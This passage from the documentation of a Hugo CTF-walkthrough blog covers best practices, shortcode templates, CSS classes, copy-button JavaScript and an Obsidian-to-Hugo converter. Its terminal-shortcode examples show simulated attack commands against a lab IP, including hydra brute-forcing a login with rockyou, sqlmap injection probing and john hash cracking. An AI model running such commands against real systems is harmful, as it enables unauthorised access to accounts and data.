- [Beginner's Guide to CTFs](/posts/beginners-guide-ctfs/)
```

#### Image Alt Text

```markdown
# Good
![Nmap scan results showing open ports 22, 80, 139, 445](/images/nmap-scan-results.jpg)

# Bad
![Scan](/images/pic1.jpg)
```

### Accessibility Best Practices

#### WCAG AAA Compliance

**Color Contrast:**
- Text on background: 7:1 ratio minimum
- Current theme: Exceeds AAA requirements

**Focus Management:**
```css
/* Always visible focus indicators */
*:focus-visible {
    outline: 2px solid var(--focus-color);
    outline-offset: 2px;
}
```

**Touch Targets:**
- Minimum 44px × 44px
- Current badges/buttons meet this requirement

#### Semantic HTML

```markdown
# Use proper headings
## Main Section
### Subsection
#### Sub-subsection

# NOT
<div style="font-size: 24px">Section</div>
```

#### Alt Text for Images

```markdown
![Descriptive alt text explaining the image](/path/to/image.jpg)
```

- Be descriptive
- Include context
- Don't start with "image of"
- Keep concise

#### Link Text

```markdown
# Good
Learn more about [nmap port scanning techniques](/posts/nmap-guide/).

# Bad
Click [here](/posts/nmap-guide/) for more information.
```

### Performance Best Practices

#### Image Optimization

**Before Upload:**
```bash
# Resize large images
convert large-image.jpg -resize 1200x -quality 85 optimized-image.jpg

# Use appropriate format
# - JPEG for photos
# - PNG for graphics with transparency
# - WebP for modern browsers
```

**Settings in config.yaml:**
```yaml
optimize_images: true
image_max_width: 1200
image_quality: 85
```

#### Content Optimization

**Code Blocks:**
```markdown
# Use syntax highlighting
```bash
nmap -sC -sV 10.10.10.10
```

# NOT plain text
nmap -sC -sV 10.10.10.10
```

**Minimal JavaScript:**
- Copy buttons: Minimal JS
- No heavy frameworks
- Vanilla JavaScript for performance

#### Build Optimization

```bash
# Production build
hugo --minify --quiet

# Check build size
du -sh public/

# Check page count
hugo --printStats | grep "pages"
```

### Maintenance Best Practices

#### Regular Updates

**Hugo Version:**
```bash
# Check current version
hugo version

# Update Hugo
# Download from https://github.com/gohugoio/hugo/releases
```

**Dependencies:**
```bash
# Update Python packages
pip3 install --upgrade -r requirements.txt

# Update theme
cd themes/PaperMod
git pull origin master
```

**Content:**
- Review old posts for accuracy
- Update links that may be broken
- Refresh outdated information

#### Backup Strategy

**Git Repository:**
```bash
# Regular commits
git add .
git commit -m "Add new CTF walkthrough"
git push origin main
```

**Full Backup:**
```bash
# Backup everything
tar -czvf backup-$(date +%Y%m%d).tar.gz . \
    --exclude=public \
    --exclude=.git \
    --exclude=node_modules
```

**Database/Data:**
- All content in Git (safe)
- Images in static/ (backup separately if large)
- Configuration in Git

#### Monitoring

**Uptime:**
- Use services like UptimeRobot, Pingdom
- Monitor main pages: home, posts list, sample post

**Performance:**
- Test with GTmetrix, PageSpeed Insights
- Monitor Core Web Vitals

**Broken Links:**
```bash
# Monthly link check
pip3 install linkchecker
linkchecker https://yourdomain.com --check-extern
```

#### Security Updates

**Hugo:**
- Update regularly for security patches

**Dependencies:**
```bash
# Check for vulnerabilities
pip3 install safety
safety check

# Update packages
pip3 install --upgrade pyyaml python-frontmatter Pillow
```

### Team Collaboration

#### Git Workflow

**Feature Branch:**
```bash
git checkout -b feature/new-post
# ... make changes
git add .
git commit -m "Add Lame walkthrough"
git push origin feature/new-post
# Create pull request
```

**Merge to Main:**
```bash
git checkout main
git pull origin main
git merge feature/new-post
# Resolve conflicts if any
git push origin main
```

#### Commit Messages

**Good:**
```bash
git commit -m "Add HackTheBox Lame CTF walkthrough

- Added complete walkthrough with nmap enumeration
- Included SMB exploitation steps
- Added privilege escalation section
- Updated tools taxonomy"
```

**Bad:**
```bash
git commit -m "update"
git commit -m "fixed stuff"
git commit -m "changes"
```

#### Code Review

**Before Submitting PR:**
- [ ] Test locally with `./scripts/workflow.sh serve`
- [ ] Build successfully with `./scripts/workflow.sh build`
- [ ] Check for broken links
- [ ] Verify images load
- [ ] Review accessibility
- [ ] Check spelling/grammar

**Review Checklist:**
- Content accuracy
- Code examples work
- Links valid
- Images load
- SEO optimization
- Accessibility compliance

---

## 13. API Reference

### Hugo Shortcode API

#### Overview

Shortcodes are custom Hugo functions that generate HTML. They're used in markdown content with the syntax: `{{< name param="value" >}}` or `{{< name >}}content{{< /name >}}`.

#### tool Shortcode

**Purpose**: Display security tools as badges

**Parameters**:
- `tool` (string, required): Tool name to display

**File**: `layouts/shortcodes/tool.html`

**Usage**:
```markdown
Inline: {{< tool tool="nmap" />}}

Multiple:
{{< tool tool="nmap" />}} {{< tool tool="burp suite" />}} {{< tool tool="metasploit" />}}
```

**Template Code**:
```go
{{ $tool := .Get "tool" }}
<span class="tool-badge">{{ $tool }}</span>
```

**Output HTML**:
```html
<span class="tool-badge">nmap</span>
```

**CSS Classes**: `.tool-badge`

#### difficulty Shortcode

**Purpose**: Display difficulty level badges

**Parameters**:
- `level` (string, required): "beginner", "intermediate", or "advanced"
- `label` (string, optional): Custom display text

**File**: `layouts/shortcodes/difficulty.html`

**Usage**:
```markdown
{{< difficulty level="beginner" />}}

{{< difficulty level="intermediate" label="Intermediate Level" />}}

{{< difficulty level="advanced" />}}
```

**Template Code**:
```go
{{ $level := .Get "level" | lower }}
{{ $label := .Get "label" | default (title $level) }}
<div class="difficulty-badge difficulty-{{ $level }}">{{ $label }}</div>
```

**Output HTML**:
```html
<div class="difficulty-badge difficulty-beginner">Beginner</div>
<div class="difficulty-badge difficulty-intermediate">Intermediate Level</div>
<div class="difficulty-badge difficulty-advanced">Advanced</div>
```

**CSS Classes**: `.difficulty-badge`, `.difficulty-beginner`, `.difficulty-intermediate`, `.difficulty-advanced`

#### callout Shortcode

**Purpose**: Display highlighted information boxes

**Parameters**:
- `type` (string, optional): Callout type (info, warning, success, danger, tip, etc.)
- `title` (string, optional): Custom title

**File**: `layouts/shortcodes/callout.html`

**Usage**:
```markdown
{{< callout type="info" title="Information" >}}Important info{{< /callout >}}

{{< callout type="warning" >}}Be careful!{{< /callout >}}

{{< callout type="success" title="Success" >}}Task completed{{< /callout >}}

{{< callout type="danger" title="Danger" >}}Critical warning{{< /callout >}}

{{< callout type="tip" title="Pro Tip" >}}Helpful hint{{< /callout >}}

{{< callout type="question" title="Question" >}}Common question{{< /callout >}}

{{< callout type="example" title="Example" >}}Code example{{< /callout >}}

{{< callout type="note" title="Note" >}}Important note{{< /callout >}}

{{< callout type="abstract" title="Abstract" >}}Summary{{< /callout >}}

{{< callout type="quote" title="Quote" >}}Quote{{< /callout >}}

{{< callout type="bug" title="Bug" >}}Bug report{{< /callout >}}

{{< callout type="todo" title="TODO" >}}Tasks{{< /callout >}}

{{< callout type="done" title="Done" >}}Completed{{< /callout >}}

{{< callout type="help" title="Help" >}}Assistance{{< /callout >}}

{{< callout type="failure" title="Failure" >}}Failed{{< /callout >}}

{{< callout type="missing" title="Missing" >}}Not found{{< /callout >}}

{{< callout type="idea" title="Idea" >}}Thought{{< /callout >}}

{{< callout type="cite" title="Cite" >}}Reference{{< /callout >}}

{{< callout type="comment" title="Comment" >}}Remark{{< /callout >}}

{{< callout type="success" title="Achievement" >}}Win{{< /callout >}}

Available Types:
- info, note → Blue
- warning → Yellow
- success, tip, done → Green
- danger, failure → Red
- question, help → Blue
- example → Gray
- abstract, summary → Gray
- bug, todo → Red/Yellow
- quote, cite, comment → Italic
- idea → Purple
```

**Template Code**:
```go
{{ $type := .Get "type" | default "info" }}
{{ $title := .Get "title" }}

{{ $icon_map := dict
  "info" "ℹ️" "note" "📝" "tip" "💡" "success" "✅"
  "warning" "⚠️" "danger" "🚨" "question" "❓"
  "abstract" "📄" "example" "📌" "quote" "💬"
}}

{{ $icon := index $icon_map $type | default "📄" }}

<div class="callout callout-{{ $type }}">
  <div class="callout-title">
    {{ if $title }}{{ $title }}{{ else }}{{ $icon }} {{ title $type }}{{ end }}
  </div>
  <div class="callout-content">
    {{ .Inner }}
  </div>
</div>
```

**Output HTML**:
```html
<div class="callout callout-info">
  <div class="callout-title">📋 Information</div>
  <div class="callout-content">Important info</div>
</div>
```

**CSS Classes**: `.callout`, `.callout-{type}` (e.g., `.callout-info`, `.callout-warning`)

#### terminal Shortcode

**Purpose**: Display terminal/console output with visual styling

**Parameters**:
- `command` (string, required): Command to display

**File**: `layouts/shortcodes/terminal.html`

**Usage**:
```markdown
{{< terminal command="nmap -sC -sV 10.10.10.10" >}}Starting Nmap scan...
Host is up (0.050s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1
80/tcp open  http    Apache 2.4.54
139/tcp open  netbios-ssn Samba smbd 4.13{{< /terminal >}}

{{< terminal command="ssh user@10.10.10.10" >}}user@10.10.10.10's password: ********
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-147-generic x86_64){{< /terminal >}}

{{< terminal command="sudo -l" >}}Matching Defaults entries for user on host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User user may run the following commands on host:
    (ALL) NOPASSWD: ALL{{< /terminal >}}

{{< terminal command="cat /root/flag.txt" >}}HTB{flag_value_here}{{< /terminal >}}

{{< terminal command="id" >}}uid=0(root) gid=0(root) groups=0(root){{< /terminal >}}

{{< terminal command="uname -a" >}}Linux host 5.4.0-147-generic #164-Ubuntu SMP Tue Mar 21 16:55:25 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux{{< /terminal >}}

{{< terminal command="whoami" >}}root{{< /terminal >}}

{{< terminal command="pwd" >}}/root{{< /terminal >}}

{{< terminal command="ls -la" >}}total 20
drwx------  2 root root 4096 Mar 22 09:00 .
drwxr-xr-x  3 user user 4096 Mar 21 16:55 .
-rw-------  1 root root   32 Mar 22 09:00 flag.txt
-rw-r--r-- 1 root root  4096 Mar 21 16:55 script.py{{< /terminal >}}

{{< terminal command="python3 script.py" >}}Starting server on port 8080...
Listening on port 8080...{{< /terminal >}}

{{< terminal command="curl http://10.10.10.10" >}}<html>
<head><title>Test Page</title></head>
<body><h1>Hello World</h1></body>
</html>{{< /terminal >}}

{{< terminal command="dirb http://10.10.10.10 /usr/share/wordlists/dirb/common.txt" >}}-----------------
dirb 8.4.0
-----------------
START_TIME: Mon Nov  2 10:30:00 2025
URL_BASE: http://10.10.10.10/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

---- Scanning URL: http://10.10.10.10/ ----
+ http://10.10.10.10/admin (CODE:200|SIZE:1234)
+ http://10.10.10.10/login (CODE:200|SIZE:5678)
+ http://10.10.10.10/index.php (CODE:200|SIZE:9101){{< /terminal >}}

{{< terminal command="sqlmap -u 'http://10.10.10.10/login.php?id=1' --batch" >}}[+] testing connection to the target URL
[+] testing if the target URL content is stable
[+] target URL content is stable
[+] testing if parameter 'id' is dynamic
[+] parameter 'id' does not appear to be dynamic
[+] heuristic (basic) test shows that parameter 'id' might be injectable{{< /terminal >}}

{{< terminal command="john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt" >}}Loaded 1 password hash (sha512crypt, $6$...)
Will run 2 OpenMP threads
Press 'q' to abort output, or any other key to continue
password123      (user){{< /terminal >}}

{{< terminal command="hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form '/login:username=^USER^&password=^PASS^:Invalid'" >}}Hydra v9.4 (c) 2022 by van Hauser/THC - Please do not use in military or secret service organizations
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-02 10:30:00
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.10.10:80/login
[80][http-post-form] host: 10.10.10.10   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found{{< /terminal >}}

{{< terminal command="msfconsole" >}}

   .:okOOOkdc'           'cdkkkkO.
 .:oOKWkKd:  .              dKkkkON.
  :oKWMNcd:   .              oWMMMWK:
 .:o0XWMMW0c.              :0NMMMMMMK:
   ;kMWNx::;.            ;OMMMMWMMMN:
    'kMMMNkd;           .kWMMMNMMXWMl'
     .oWMMMXd.         oWMMMMMMMMMMMXl'
       ;NMMMW0d:      cWMMMMMMMMMMMMMMd.
        .cKMMMO.     .kMMMMMMMMMMMMMMMK.
          'lONMMl   :WMMMMMMMMMMMMMMM0.
             .lkX'  .NMMMMMMMMMMMMMMX.
                .  .cMMMMMMMMMMMMMMN.
                      .lkKWMMMMMMXo.
                           .';:ccc:;'.


       =[ metasploit v6.3.4#0 ]          <{{ /terminal >}}

This is a simulated terminal output with a realistic command-line interface. It shows the progression of a penetration test, from initial reconnaissance to privilege escalation.

The terminal shortcode is ideal for:
- CTF walkthroughs
- Penetration testing documentation
- Command-line tutorial outputs
- Shell session recordings

The key features of the terminal shortcode include:

1. **Visual Terminal Header**: The top section with three colored dots (red, yellow, green) mimics a standard terminal window appearance

2. **Command Display**: The command is shown with a stylized prompt including username, hostname, and path

3. **Output Area**: The main content area displays the actual output from the command execution

4. **Syntax Highlighting**: Both command and output are clearly distinguished through different styling

5. **Scrollable Output**: For longer outputs, the terminal area becomes scrollable

6. **Monospace Font**: Ensures proper alignment of output text

7. **Copy Functionality**: Users can easily copy commands from the terminal window
```

**Template Code**:
```go
{{ $command := .Get "command" }}
<div class="terminal-block">
  <div class="terminal-header">
    <div class="terminal-controls">
      <span class="terminal-dot" style="background: #ff5f56;"></span>
      <span class="terminal-dot" style="background: #ffbd2e;"></span>
      <span class="terminal-dot" style="background: #27c93f;"></span>
    </div>
    <div class="terminal-title">Terminal</div>
  </div>
  <div class="terminal">
    <div class="prompt">
      <span class="user">hrithik@local</span>
      <span class="path">~</span>
      <span class="symbol">$</span>
      <span class="command">{{ $command }}</span>
    </div>
    <div class="output">
      {{ .Inner }}
    </div>
  </div>
</div>
```

**Output HTML**:
```html
<div class="terminal-block">
  <div class="terminal-header">
    <div class="terminal-controls">
      <span class="terminal-dot" style="background: #ff5f56;"></span>
      <span class="terminal-dot" style="background: #ffbd2e;"></span>
      <span class="terminal-dot" style="background: #27c93f;"></span>
    </div>
    <div class="terminal-title">Terminal</div>
  </div>
  <div class="terminal">
    <div class="prompt">
      <span class="user">hrithik@local</span>
      <span class="path">~</span>
      <span class="symbol">$</span>
      <span class="command">nmap -sC -sV 10.10.10.10</span>
    </div>
    <div class="output">
      Starting Nmap scan...
    </div>
  </div>
</div>
```

**CSS Classes**: `.terminal-block`, `.terminal-header`, `.terminal`, `.prompt`, `.output`

#### code Shortcode

**Purpose**: Display code blocks with optional title and syntax highlighting

**Parameters**:
- `language` (string, optional): Language for syntax highlighting (default: "bash")
- `title` (string, optional): Optional code block title

**File**: `layouts/shortcodes/code.html`

**Usage**:
```markdown
{{< code language="bash" title="Port Scan Script" >}}nmap -sC -sV 10.10.10.10
# This will scan common ports and get version info{{< /code >}}

{{< code language="python" title="Socket Connection" >}}import socket
s = socket.socket()
s.connect(('10.10.10.10', 80))
response = s.recv(1024){{< /code >}}

{{< code >}}# No language specified (defaults to bash)
echo "Hello World"{{< /code >}}

{{< code language="html" >}}<div class="example">
    <p>Hello World</p>
</div>{{< /code >}}

{{< code language="javascript" >}}const message = "Hello World";
console.log(message);

function greet(name) {
    return `Hello, ${name}!`;
}

greet("World");{{< /code >}}

{{< code language="go" >}}package main

import "fmt"

func main() {
    fmt.Println("Hello, World!")
}{{< /code >}}

{{< code language="rust" >}}fn main() {
    println!("Hello, World!");
}{{< /code >}}

{{< code language="php" >}}<?php
echo "Hello, World!";
?>{{< /code >}}

{{< code language="java" >}}public class HelloWorld {
    public static void main(String[] args) {
        System.out.println("Hello, World!");
    }
}{{< /code >}}

{{< code language="csharp" >}}using System;

class Program
{
    static void Main()
    {
        Console.WriteLine("Hello, World!");
    }
}{{< /code >}}

{{< code language="sql" >}}SELECT * FROM users WHERE username = 'admin';

CREATE TABLE users (
    id INT PRIMARY KEY,
    username VARCHAR(50) NOT NULL,
    password VARCHAR(255) NOT NULL
);{{< /code >}}

{{< code language="powershell" >}}Get-Process | Where-Object {$_.CPU -gt 100}

Write-Host "Hello, World!" -ForegroundColor Green{{< /code >}}

Available Languages:
- bash, sh, shell
- python
- javascript, js
- html
- css
- json
- yaml, yml
- go, golang
- rust
- php
- java
- csharp, cs
- sql
- powershell, ps1
- ruby
- perl
- c
- cpp, c++
- r
- kotlin
- swift
- typescript, ts
- scala
- objectivec
- dart
- vim
- ini, conf
- makefile
- dockerfile
- nginx
- apache
- xml
- markdown
```

**Template Code**:
```go
{{ $language := .Get "language" | default "bash" }}
{{ $title := .Get "title" }}
<div class="code-block-wrapper">
  {{ if $title }}
  <div class="code-block-title">{{ $title }}</div>
  {{ end }}
  <div class="code-block">
    <pre><code class="language-{{ $language }}">{{ .Inner }}</code></pre>
  </div>
</div>
```

**Output HTML**:
```html
<div class="code-block-wrapper">
  <div class="code-block-title">Port Scan Script</div>
  <div class="code-block">
    <pre><code class="language-bash">
nmap -sC -sV 10.10.10.10
# This will scan common ports and get version info
    </code></pre>
  </div>
</div>
```

**CSS Classes**: `.code-block-wrapper`, `.code-block-title`, `.code-block`

#### image Shortcode

**Purpose**: Display images with optional caption and optimization

**Parameters**:
- `src` (string, required): Image path
- `alt` (string, optional): Alt text
- `caption` (string, optional): Image caption

**File**: `layouts/shortcodes/image.html`

**Usage**:
```markdown
{{< image src="/images/nmap-scan-results.jpg" caption="Nmap scan results showing open ports" >}}

{{< image src="/images/web-directory.png" alt="Web directory enumeration results" caption="Gobuster directory scan output" >}}

{{< image src="/images/flag-location.png" caption="Root flag location in /root directory" >}}

{{< image src="/images/screenshot.png" alt="Screenshot of the web application login page" caption="Target web application login interface" >}}

This is a comprehensive image shortcode for Hugo that allows you to easily include images in your posts with optional captions and alt text. The shortcode is part of the custom Hugo template system and provides a clean, standardized way to display images.

Key features of this shortcode include:

1. **Required Source**: The `src` parameter specifies the path to the image file. This should be a relative path from the `static` directory.

2. **Alt Text**: The `alt` parameter provides descriptive text for the image, which is important for accessibility and SEO.

3. **Caption Support**: The `caption` parameter allows you to add descriptive text below the image, providing context for readers.

4. **Responsive Design**: The image will automatically adjust to fit the container while maintaining its aspect ratio.

5. **Lazy Loading**: Images can be configured to load lazily, improving page load performance.

6. **Optimization**: The shortcode can work with image processing tools to automatically optimize images for web display.

The image shortcode is particularly useful for CTF walkthroughs and security tutorials where screenshots and visual documentation are important. It helps maintain consistency in image presentation across all blog posts.

Usage in CTF walkthroughs:
- Network scan results
- Exploitation screenshots
- Flag locations
- Tool outputs
- Step-by-step visual guides

This shortcode ensures all images are properly formatted with captions and alt text, improving both the user experience and accessibility compliance.
```

**Template Code**:
```go
{{ $src := .Get "src" }}
{{ $alt := .Get "alt" | default "" }}
{{ $caption := .Get "caption" | default "" }}

<figure class="image">
  <img src="{{ $src }}" alt="{{ $alt }}">
  {{ if $caption }}
  <figcaption>{{ $caption }}</figcaption>
  {{ end }}
</figure>
```

**Output HTML**:
```html
<figure class="image">
  <img src="/images/nmap-scan-results.jpg" alt="Nmap scan results showing open ports">
  <figcaption>Nmap scan results showing open ports</figcaption>
</figure>
```

**CSS Classes**: `.image`, `figcaption`

### CSS Classes API

#### Color Variables

**Root Variables** (custom.css lines 1-20):
```css
:root {
    --primary-color: #0a0e27;        /* Main background */
    --secondary-color: #151b3d;      /* Secondary background */
    --tertiary-color: #1e2749;       /* Card background */
    --accent-color: #00ff88;         /* Primary accent (neon green) */
    --accent-secondary: #00d4ff;     /* Secondary accent (cyan) */
    --text-color: #e4e4e7;           /* Primary text */
    --text-secondary: #a1a1aa;       /* Secondary text */
    --text-muted: #71717a;           /* Muted text */
    --border-color: #2a2f4a;         /* Borders */
    --success-color: #00ff88;        /* Success/positive */
    --warning-color: #fbbf24;        /* Warnings */
    --danger-color: #ff4444;         /* Danger/critical */
    --info-color: #00d4ff;           /* Information */
    --focus-color: #00d4ff;          /* Focus outline */
    --shadow-color: rgba(0, 212, 255, 0.3);  /* Focus glow */
    --heading-font: 'Inter', sans-serif;
    --body-font: 'Inter', sans-serif;
    --code-font: 'JetBrains Mono', monospace;
}
```

**Usage in CSS**:
```css
.example {
    background-color: var(--primary-color);
    color: var(--text-color);
    border-color: var(--border-color);
}
```

#### Difficulty Badge Classes

**Base Class**:
```css
.difficulty-badge
```

**Difficulty Modifiers**:
```css
.difficulty-beginner   /* Green theme */
.difficulty-intermediate  /* Yellow/Orange theme */
.difficulty-advanced   /* Red theme */
```

**CSS Properties**:
```css
.difficulty-badge {
    display: inline-block;
    padding: 0.4rem 0.8rem;
    border-radius: 4px;
    font-weight: 600;
    font-size: 0.875rem;
    margin: 0.5rem 0;
    transition: all 0.3s ease;
}
```

#### Callout Classes

**Base Class**:
```css
.callout
```

**Type Modifiers**:
```css
.callout-info        /* Blue/cyan theme */
.callout-warning     /* Yellow theme */
.callout-success     /* Green theme */
.callout-danger      /* Red theme */
.callout-tip         /* Green theme */
.callout-question    /* Blue theme */
.callout-example     /* Gray theme */
.callout-note        /* Blue theme */
```

**Child Elements**:
```css
.callout-title       /* Title styling */
.callout-content     /* Content styling */
```

#### Tool Badge Classes

**Base Class**:
```css
.tool-badge
```

**CSS Properties**:
```css
.tool-badge {
    display: inline-block;
    padding: 0.3rem 0.6rem;
    background-color: var(--tertiary-color);
    border: 1px solid var(--border-color);
    border-radius: 12px;
    font-size: 0.75rem;
    font-weight: 500;
    margin: 0.2rem;
    transition: all 0.3s ease;
}
```

#### Terminal Classes

**Base Classes**:
```css
.terminal-block      /* Container */
.terminal-header     /* Top bar */
.terminal            /* Content area */
```

**Child Elements**:
```css
.terminal-controls   /* Colored dots */
.terminal-dot        /* Individual dots */
.terminal-title      /* Title text */
.prompt              /* Command prompt */
.user                /* Username styling */
.path                /* Path styling */
.symbol              /* Symbol ($) styling */
.command             /* Command styling */
.output              /* Output text */
```

#### Code Block Classes

**Base Classes**:
```css
.code-block-wrapper  /* Container */
.code-block-title    /* Optional title */
.code-block          /* Code container */
```

**Copy Button**:
```css
.copy-button         /* Button styling */
```

#### Responsive Breakpoints

**Desktop** (min-width: 1024px):
```css
@media (min-width: 1024px) {
    .container {
        max-width: 800px;
        padding: 2rem;
    }
}
```

**Tablet** (max-width: 1024px, min-width: 769px):
```css
@media (max-width: 1024px) and (min-width: 769px) {
    .container {
        max-width: 750px;
        padding: 1.5rem;
    }
}
```

**Mobile** (max-width: 768px):
```css
@media (max-width: 768px) {
    .container {
        padding: 1rem;
    }
}
```

### JavaScript API

#### Copy Button Functionality

**Function**: `addCopyButtons()`

**Purpose**: Automatically adds copy buttons to all code blocks

**Location**: `assets/js/copy-buttons.js` (lines 15-107)

**Usage**:
```javascript
// Automatically called on DOMContentLoaded
document.addEventListener('DOMContentLoaded', function() {
    addCopyButtons();
});
```

**How It Works**:
1. Selects all `<pre><code>` elements
2. Creates copy button with SVG icon
3. Adds click event listener
4. Uses Clipboard API to copy text
5. Provides visual feedback (success/failure)
6. Resets after 2 seconds

**Parameters**: None (automatically processes all code blocks)

**Returns**: void

**Example**:
```javascript
// Add copy buttons to new code blocks dynamically
const newCodeBlock = document.createElement('pre');
newCodeBlock.innerHTML = '<code>nmap -sC -sV 10.10.10.10</code>';
document.body.appendChild(newCodeBlock);

// Re-run to add button to new block
addCopyButtons();
```

#### Terminal Copy Functionality

**Function**: `addTerminalCopyButtons()`

**Purpose**: Adds copy buttons specifically to terminal blocks

**Location**: `assets/js/copy-buttons.js` (lines 112-175)

**Usage**:
```javascript
// Called automatically with delay
document.addEventListener('DOMContentLoaded', function() {
    setTimeout(addTerminalCopyButtons, 500);
});
```

**How It Works**:
1. Selects `.terminal` elements
2. Extracts first command from content
3. Copies only the command (not output)
4. Updates button text to "Copied!"
5. Resets after 2 seconds

**Parameters**: None

**Returns**: void

#### Global Configuration

**CSS Variables for JS**:
```javascript
// The copy button uses these CSS variables:
const styles = getComputedStyle(document.documentElement);
const successColor = styles.getPropertyValue('--success-color');
const dangerColor = styles.getPropertyValue('--danger-color');
const primaryColor = styles.getPropertyValue('--primary-color');
const textColor = styles.getPropertyValue('--text-color');
```

**Browser Compatibility**:
- Requires Clipboard API (modern browsers)
- Fallback for older browsers:
```javascript
try {
    await navigator.clipboard.writeText(code);
} catch (err) {
    // Fallback for older browsers
    const textArea = document.createElement('textarea');
    textArea.value = code;
    document.body.appendChild(textArea);
    textArea.select();
    document.execCommand('copy');
    document.body.removeChild(textArea);
}
```

### Hugo Template Functions

#### .Get Function

**Purpose**: Retrieve shortcode parameter value

**Syntax**: `{{ .Get "parameter-name" }}`

**Example**:
```go
{{ $tool := .Get "tool" }}
{{ $level := .Get "level" }}
{{ $type := .Get "type" | default "info" }}
```

#### Default Function

**Purpose**: Provide default value if parameter is empty

**Syntax**: `{{ .Get "param" | default "default-value" }}`

**Example**:
```go
{{ $title := .Get "title" | default "Default Title" }}
{{ $level := .Get "level" | lower | default "beginner" }}
```

#### Lower Function

**Purpose**: Convert to lowercase

**Syntax**: `{{ "TEXT" | lower }}` → `"text"`

**Example**:
```go
{{ $level := .Get "level" | lower }}
<!-- Result: "beginner" even if parameter is "Beginner" -->
```

#### Title Function

**Purpose**: Convert to Title Case

**Syntax**: `{{ "text here" | title }}` → `"Text Here"`

**Example**:
```go
{{ $level := .Get "level" | title }}
<!-- Result: "Beginner" from "beginner" -->
```

#### Dict Function

**Purpose**: Create key-value map (dictionary)

**Syntax**: `{{ dict "key1" "value1" "key2" "value2" }}`

**Example**:
```go
{{ $icon_map := dict
  "info" "ℹ️"
  "warning" "⚠️"
  "success" "✅"
}}
```

#### Index Function

**Purpose**: Get value from dict/map by key

**Syntax**: `{{ index $map "key" }}`

**Example**:
```go
{{ $icon := index $icon_map $type }}
<!-- Get icon for the given type -->
```

#### Inner Function

**Purpose**: Get content inside shortcode tags

**Syntax**: `{{ .Inner }}`

**Example**:
```markdown
{{% callout %}}Content here{{% /callout %}}
```
```go
{{ .Inner }}  <!-- Returns "Content here" -->
```

### Python Converter API

#### Configuration Loading

**Class**: `ObsidianToHugoConverter`

**Initialization**:
```python
converter = ObsidianToHugoConverter(config_path="scripts/config.yaml")
```

**Method**: `load_config(config_path: str) -> Dict`
- Loads YAML configuration
- Merges with defaults
- Returns configuration dictionary

**Example**:
```python
config = converter.load_config("custom-config.yaml")
print(config['obsidian_vault'])  # "./obsidian-vault"
```

#### File Processing

**Method**: `process_file(obsidian_file: Path, output_file: Path) -> None`
- Converts single Obsidian file to Hugo format
- Handles front matter
- Converts syntax
- Processes images
- Writes output

**Example**:
```python
from pathlib import Path

converter = ObsidianToHugoConverter()
converter.process_file(
    Path("obsidian-vault/posts/my-post.md"),
    Path("content/posts/my-post.md")
)
```

#### Syntax Conversion

**Method**: `convert_wikilinks_to_links(content: str) -> str`
- Converts `[[Wiki Link]]` to `[Wiki Link](/wiki-link/)`
- Returns converted content

**Example**:
```python
input = "See [[Nmap Guide]] for details."
output = converter.convert_wikilinks_to_links(input)
# Output: "See [Nmap Guide](/nmap-guide/) for details."
```

**Method**: `convert_callouts(content: str) -> str`
- Converts `> [!type] Title` to `<div class="callout callout-type">`
- Handles multiple callout types

**Example**:
```python
input = "> [!warning] Important\n> This is a warning"
output = converter.convert_callouts(input)
```

#### Image Processing

**Method**: `process_images_in_content(content: str, source_dir: Path) -> str`
- Finds images in markdown
- Copies to static/images/
- Optimizes (if enabled)
- Updates references

**Example**:
```python
content = "![Image](attachments/pic.jpg)"
output = converter.process_images_in_content(content, obsidian_dir)
# Image copied to static/images/ and reference updated
```

#### Front Matter Handling

**Method**: `extract_and_process_frontmatter(content: str, file_path: Path) -> tuple`
- Extracts existing front matter
- Generates missing fields
- Returns (content, front_matter)

**Example**:
```python
content, front_matter = converter.extract_and_process_frontmatter(raw_content, file_path)
print(front_matter['title'])  # Generated title
```

**Method**: `generate_frontmatter(file_path: Path, existing: Dict) -> Dict`
- Auto-generates title from filename
- Adds date
- Auto-extracts tools/platforms/difficulty
- Returns complete front matter

**Example**:
```python
front_matter = converter.generate_frontmatter(Path("my-post.md"), {})
# Returns dict with title, date, categories, etc.
```

#### Auto-Extraction

**Method**: `auto_extract_tools(content: str) -> List[str]`
- Scans content for tool names
- Returns list of detected tools

**Example**:
```python
tools = converter.auto_extract_tools("We use nmap and burp suite...")
# Returns ["nmap", "burp suite"]
```

**Method**: `auto_extract_platforms(content: str) -> List[str]`
- Detects platform mentions
- Maps to standard names

**Method**: `auto_extract_difficulty(content: str) -> List[str]`
- Analyzes content for difficulty indicators
- Returns difficulty level

#### Configuration Schema

**Complete config.yaml reference**:
```yaml
# Path configuration
obsidian_vault: string          # Source directory path
hugo_content: string            # Output directory path
hugo_static: string             # Image storage path
obsidian_attachments_folder: string  # Images folder name

# Image handling
auto_copy_images: boolean       # Auto-copy images
optimize_images: boolean        # Optimize images
image_max_width: integer        # Max width in pixels
image_quality: integer          # JPEG quality (1-100)
image_storage_strategy: string  # "by-post", "by-type", "flat"

# Front matter
create_missing_frontmatter: boolean  # Generate missing front matter
default_draft: boolean              # Default draft status
default_categories: array           # Default categories
default_difficulties: array         # Default difficulties
default_platforms: array            # Default platforms
default_tools: array                # Default tools
generate_description: boolean       # Auto-generate description
title_case: boolean                 # Title case conversion

# Auto-extraction
auto_extract_tools: boolean         # Extract tools
auto_extract_platforms: boolean     # Extract platforms
auto_extract_difficulty: boolean    # Extract difficulty

# Filename processing
auto_generate_title: boolean        # Generate title from filename

# Watch mode
watch_interval: integer             # Polling interval in seconds

# Logging
log_level: string                   # "DEBUG", "INFO", "WARNING", "ERROR"
verbose: boolean                    # Verbose output
```

### Workflow Script API

#### Command Line Interface

**Usage**: `./scripts/workflow.sh [COMMAND]`

**Available Commands**:

1. **setup**
   - Purpose: Initialize directory structure
   - Arguments: None
   - Creates: obsidian-vault/posts/, obsidian-vault/attachments/, static/images/

2. **convert**
   - Purpose: Convert Obsidian to Hugo
   - Arguments: None
   - Runs: Python converter on all .md files

